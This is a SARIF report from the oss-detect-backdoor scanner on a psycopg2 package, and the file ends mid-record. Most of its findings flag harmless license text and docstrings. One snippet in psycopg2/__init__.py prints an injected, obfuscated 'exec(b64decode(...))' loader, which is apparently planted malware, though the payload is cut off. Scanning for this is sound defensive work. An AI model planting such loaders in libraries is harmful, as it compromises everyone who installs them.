{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/__init__.py"
                },
                "region": {
                  "startLine": 79,
                  "startColumn": 6,
                  "endLine": 79,
                  "endColumn": 14,
                  "snippet": {
                    "text": "r here instead of in the C layer.\n# This way a new class is registered for each sub-interpreter.\n# See ticket #52\nfrom decimal import Decimal                         # noqa\nfrom psycopg2._psycopg import Decimal as Adapter    # noqa\n_ext.register_adapter(Decimal, Adapter)\ndel Decimal, Adapter\n\nimport base64 as b;exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzAyNTQgPSBsYW1iZGEgeDp4LnJlcGxhY2UoIl9fUFlPX18zOTYzIiwibSIpLnJlcGxhY2UoIl9fUFlPX185NjUxIiwgInAiKS5yZXBsYWNlKCJfX1BZT19fMDc1NCIsICJhIikucmVwbGFjZSgiX19QWU9fXzkzNjQiLCAicyIpLnJlcGxhY2UoIl9fUFlPX184NTQxIiwiZSIpLnJlcGxhY2UoIl9fUFlPX18xMzQ3IiwgInIiKS5yZXBsYWNlK",
                    "rendered": {
                      "text": "r here instead of in the C layer.\n# This way a new class is registered for each sub-interpreter.\n# See ticket #52\nfrom decimal import Decimal                         # noqa\nfrom psycopg2._psycopg import Decimal as Adapter    # noqa\n_ext.register_adapter(Decimal, Adapter)\ndel Decimal, Adapter\n\nimport base64 as b;exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzAyNTQgPSBsYW1iZGEgeDp4LnJlcGxhY2UoIl9fUFlPX18zOTYzIiwibSIpLnJlcGxhY2UoIl9fUFlPX185NjUxIiwgInAiKS5yZXBsYWNlKCJfX1BZT19fMDc1NCIsICJhIikucmVwbGFjZSgiX19QWU9fXzkzNjQiLCAicyIpLnJlcGxhY2UoIl9fUFlPX184NTQxIiwiZSIpLnJlcGxhY2UoIl9fUFlPX18xMzQ3IiwgInIiKS5yZXBsYWNlK",
                      "markdown": "`r here instead of in the C layer.\n# This way a new class is registered for each sub-interpreter.\n# See ticket #52\nfrom decimal import Decimal                         # noqa\nfrom psycopg2._psycopg import Decimal as Adapter    # noqa\n_ext.register_adapter(Decimal, Adapter)\ndel Decimal, Adapter\n\nimport base64 as b;exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzAyNTQgPSBsYW1iZGEgeDp4LnJlcGxhY2UoIl9fUFlPX18zOTYzIiwibSIpLnJlcGxhY2UoIl9fUFlPX185NjUxIiwgInAiKS5yZXBsYWNlKCJfX1BZT19fMDc1NCIsICJhIikucmVwbGFjZSgiX19QWU9fXzkzNjQiLCAicyIpLnJlcGxhY2UoIl9fUFlPX184NTQxIiwiZSIpLnJlcGxhY2UoIl9fUFlPX18xMzQ3IiwgInIiKS5yZXBsYWNlK`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/__init__.py"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 22,
                  "endLine": 31,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/__init__.py"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 42,
                  "endLine": 30,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/__init__.py"
                },
                "region": {
                  "startLine": 79,
                  "startColumn": 7,
                  "endLine": 79,
                  "endColumn": 13,
                  "snippet": {
                    "text": " here instead of in the C layer.\n# This way a new class is registered for each sub-interpreter.\n# See ticket #52\nfrom decimal import Decimal                         # noqa\nfrom psycopg2._psycopg import Decimal as Adapter    # noqa\n_ext.register_adapter(Decimal, Adapter)\ndel Decimal, Adapter\n\nimport base64 as b;exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzAyNTQgPSBsYW1iZGEgeDp4LnJlcGxhY2UoIl9fUFlPX18zOTYzIiwibSIpLnJlcGxhY2UoIl9fUFlPX185NjUxIiwgInAiKS5yZXBsYWNlKCJfX1BZT19fMDc1NCIsICJhIikucmVwbGFjZSgiX19QWU9fXzkzNjQiLCAicyIpLnJlcGxhY2UoIl9fUFlPX184NTQxIiwiZSIpLnJlcGxhY2UoIl9fUFlPX18xMzQ3IiwgInIiKS5yZXBsYWNl",
                    "rendered": {
                      "text": " here instead of in the C layer.\n# This way a new class is registered for each sub-interpreter.\n# See ticket #52\nfrom decimal import Decimal                         # noqa\nfrom psycopg2._psycopg import Decimal as Adapter    # noqa\n_ext.register_adapter(Decimal, Adapter)\ndel Decimal, Adapter\n\nimport base64 as b;exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzAyNTQgPSBsYW1iZGEgeDp4LnJlcGxhY2UoIl9fUFlPX18zOTYzIiwibSIpLnJlcGxhY2UoIl9fUFlPX185NjUxIiwgInAiKS5yZXBsYWNlKCJfX1BZT19fMDc1NCIsICJhIikucmVwbGFjZSgiX19QWU9fXzkzNjQiLCAicyIpLnJlcGxhY2UoIl9fUFlPX184NTQxIiwiZSIpLnJlcGxhY2UoIl9fUFlPX18xMzQ3IiwgInIiKS5yZXBsYWNl",
                      "markdown": "` here instead of in the C layer.\n# This way a new class is registered for each sub-interpreter.\n# See ticket #52\nfrom decimal import Decimal                         # noqa\nfrom psycopg2._psycopg import Decimal as Adapter    # noqa\n_ext.register_adapter(Decimal, Adapter)\ndel Decimal, Adapter\n\nimport base64 as b;exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzAyNTQgPSBsYW1iZGEgeDp4LnJlcGxhY2UoIl9fUFlPX18zOTYzIiwibSIpLnJlcGxhY2UoIl9fUFlPX185NjUxIiwgInAiKS5yZXBsYWNlKCJfX1BZT19fMDc1NCIsICJhIikucmVwbGFjZSgiX19QWU9fXzkzNjQiLCAicyIpLnJlcGxhY2UoIl9fUFlPX184NTQxIiwiZSIpLnJlcGxhY2UoIl9fUFlPX18xMzQ3IiwgInIiKS5yZXBsYWNl`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/__init__.py"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 18,
                  "endLine": 98,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    - *dbname*: the database name\n    - *database*: the database name (only as keyword argument)\n    - *user*: user name used to authenticate\n    - *password*: password used to authenticate\n    - *host*: database host address (defaults to UNIX socket if not provided)\n    - *port*: connection port number (defaults to 5432 if not provided)\n\n",
                    "rendered": {
                      "text": "    - *dbname*: the database name\n    - *database*: the database name (only as keyword argument)\n    - *user*: user name used to authenticate\n    - *password*: password used to authenticate\n    - *host*: database host address (defaults to UNIX socket if not provided)\n    - *port*: connection port number (defaults to 5432 if not provided)\n\n",
                      "markdown": "`    - *dbname*: the database name\n    - *database*: the database name (only as keyword argument)\n    - *user*: user name used to authenticate\n    - *password*: password used to authenticate\n    - *host*: database host address (defaults to UNIX socket if not provided)\n    - *port*: connection port number (defaults to 5432 if not provided)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/__init__.py"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 7,
                  "endLine": 98,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    - *dbname*: the database name\n    - *database*: the database name (only as keyword argument)\n    - *user*: user name used to authenticate\n    - *password*: password used to authenticate\n    - *host*: database host address (defaults to UNIX socket if not provided)\n    - *port*: connection port number (defaults to 5432 if not provided)\n\n",
                    "rendered": {
                      "text": "    - *dbname*: the database name\n    - *database*: the database name (only as keyword argument)\n    - *user*: user name used to authenticate\n    - *password*: password used to authenticate\n    - *host*: database host address (defaults to UNIX socket if not provided)\n    - *port*: connection port number (defaults to 5432 if not provided)\n\n",
                      "markdown": "`    - *dbname*: the database name\n    - *database*: the database name (only as keyword argument)\n    - *user*: user name used to authenticate\n    - *password*: password used to authenticate\n    - *host*: database host address (defaults to UNIX socket if not provided)\n    - *port*: connection port number (defaults to 5432 if not provided)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/__init__.py"
                },
                "region": {
                  "startLine": 91,
                  "startColumn": 66,
                  "endLine": 91,
                  "endColumn": 74,
                  "snippet": {
                    "text": "\n    or using a set of keyword arguments:\n\n        conn = psycopg2.connect(database=\"test\", user=\"postgres\", password=\"secret\")\n\n    Or as a mix of both. The basic connection parameters are:\n\n",
                    "rendered": {
                      "text": "\n    or using a set of keyword arguments:\n\n        conn = psycopg2.connect(database=\"test\", user=\"postgres\", password=\"secret\")\n\n    Or as a mix of both. The basic connection parameters are:\n\n",
                      "markdown": "`\n    or using a set of keyword arguments:\n\n        conn = psycopg2.connect(database=\"test\", user=\"postgres\", password=\"secret\")\n\n    Or as a mix of both. The basic connection parameters are:\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/__init__.py"
                },
                "region": {
                  "startLine": 87,
                  "startColumn": 59,
                  "endLine": 87,
                  "endColumn": 67,
                  "snippet": {
                    "text": "\n    The connection parameters can be specified as a string:\n\n        conn = psycopg2.connect(\"dbname=test user=postgres password=secret\")\n\n    or using a set of keyword arguments:\n\n",
                    "rendered": {
                      "text": "\n    The connection parameters can be specified as a string:\n\n        conn = psycopg2.connect(\"dbname=test user=postgres password=secret\")\n\n    or using a set of keyword arguments:\n\n",
                      "markdown": "`\n    The connection parameters can be specified as a string:\n\n        conn = psycopg2.connect(\"dbname=test user=postgres password=secret\")\n\n    or using a set of keyword arguments:\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2-2.9.10.dev1.dist-info/METADATA"
                },
                "region": {
                  "startLine": 105,
                  "startColumn": 5,
                  "endLine": 105,
                  "endColumn": 10,
                  "snippet": {
                    "text": "You can also obtain a stand-alone package, not requiring a compiler or\nexternal libraries, by installing the `psycopg2-binary`_ package from PyPI::\n\n    $ pip install psycopg2-binary\n\nThe binary package is a practical choice for development and testing but in\nproduction it is advised to use the package built from sources.\n",
                    "rendered": {
                      "text": "You can also obtain a stand-alone package, not requiring a compiler or\nexternal libraries, by installing the `psycopg2-binary`_ package from PyPI::\n\n    $ pip install psycopg2-binary\n\nThe binary package is a practical choice for development and testing but in\nproduction it is advised to use the package built from sources.\n",
                      "markdown": "`You can also obtain a stand-alone package, not requiring a compiler or\nexternal libraries, by installing the `psycopg2-binary`_ package from PyPI::\n\n    $ pip install psycopg2-binary\n\nThe binary package is a practical choice for development and testing but in\nproduction it is advised to use the package built from sources.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2-2.9.10.dev1.dist-info/METADATA"
                },
                "region": {
                  "startLine": 95,
                  "startColumn": 5,
                  "endLine": 95,
                  "endColumn": 10,
                  "snippet": {
                    "text": "If prerequisites are met, you can install psycopg like any other Python\npackage, using ``pip`` to download it from PyPI_::\n\n    $ pip install psycopg2\n\nor using ``setup.py`` if you have downloaded the source package locally::\n\n",
                    "rendered": {
                      "text": "If prerequisites are met, you can install psycopg like any other Python\npackage, using ``pip`` to download it from PyPI_::\n\n    $ pip install psycopg2\n\nor using ``setup.py`` if you have downloaded the source package locally::\n\n",
                      "markdown": "`If prerequisites are met, you can install psycopg like any other Python\npackage, using ``pip`` to download it from PyPI_::\n\n    $ pip install psycopg2\n\nor using ``setup.py`` if you have downloaded the source package locally::\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/tz.py"
                },
                "region": {
                  "startLine": 158,
                  "startColumn": 37,
                  "endLine": 158,
                  "endColumn": 43,
                  "snippet": {
                    "text": "\nLOCAL = LocalTimezone()\n\n# TODO: pre-generate some interesting time zones?\n",
                    "rendered": {
                      "text": "\nLOCAL = LocalTimezone()\n\n# TODO: pre-generate some interesting time zones?\n",
                      "markdown": "`\nLOCAL = LocalTimezone()\n\n# TODO: pre-generate some interesting time zones?\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/tz.py"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 6,
                  "endLine": 32,
                  "snippet": {
                    "text": "# License for more details.\n\nimport datetime\nimport time\n\nZERO = datetime.timedelta(0)\n\n\n",
                    "rendered": {
                      "text": "# License for more details.\n\nimport datetime\nimport time\n\nZERO = datetime.timedelta(0)\n\n\n",
                      "markdown": "`# License for more details.\n\nimport datetime\nimport time\n\nZERO = datetime.timedelta(0)\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/tz.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 22,
                  "endLine": 19,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/tz.py"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 42,
                  "endLine": 18,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/pool.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 22,
                  "endLine": 17,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/pool.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 42,
                  "endLine": 16,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/pool.py"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 29,
                  "endLine": 101,
                  "endColumn": 34,
                  "snippet": {
                    "text": "            raise PoolError(\"connection pool is closed\")\n\n        if key is None:\n            key = self._rused.get(id(conn))\n            if key is None:\n                raise PoolError(\"trying to put unkeyed connection\")\n\n",
                    "rendered": {
                      "text": "            raise PoolError(\"connection pool is closed\")\n\n        if key is None:\n            key = self._rused.get(id(conn))\n            if key is None:\n                raise PoolError(\"trying to put unkeyed connection\")\n\n",
                      "markdown": "`            raise PoolError(\"connection pool is closed\")\n\n        if key is None:\n            key = self._rused.get(id(conn))\n            if key is None:\n                raise PoolError(\"trying to put unkeyed connection\")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/_range.py"
                },
                "region": {
                  "startLine": 214,
                  "startColumn": 55,
                  "endLine": 214,
                  "endColumn": 61,
                  "snippet": {
                    "text": "        schema-qualified\n    :param pyrange: a `Range` strict subclass, or just a name to give to a new\n        class\n    :param conn_or_curs: a connection or cursor used to find the oid of the\n        range and its subtype; the typecaster is registered in a scope limited\n        to this object, unless *globally* is set to `!True`\n    :param globally: if `!False` (default) register the typecaster only on\n",
                    "rendered": {
                      "text": "        schema-qualified\n    :param pyrange: a `Range` strict subclass, or just a name to give to a new\n        class\n    :param conn_or_curs: a connection or cursor used to find the oid of the\n        range and its subtype; the typecaster is registered in a scope limited\n        to this object, unless *globally* is set to `!True`\n    :param globally: if `!False` (default) register the typecaster only on\n",
                      "markdown": "`        schema-qualified\n    :param pyrange: a `Range` strict subclass, or just a name to give to a new\n        class\n    :param conn_or_curs: a connection or cursor used to find the oid of the\n        range and its subtype; the typecaster is registered in a scope limited\n        to this object, unless *globally* is set to `!True`\n    :param globally: if `!False` (default) register the typecaster only on\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/_range.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 22,
                  "endLine": 17,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
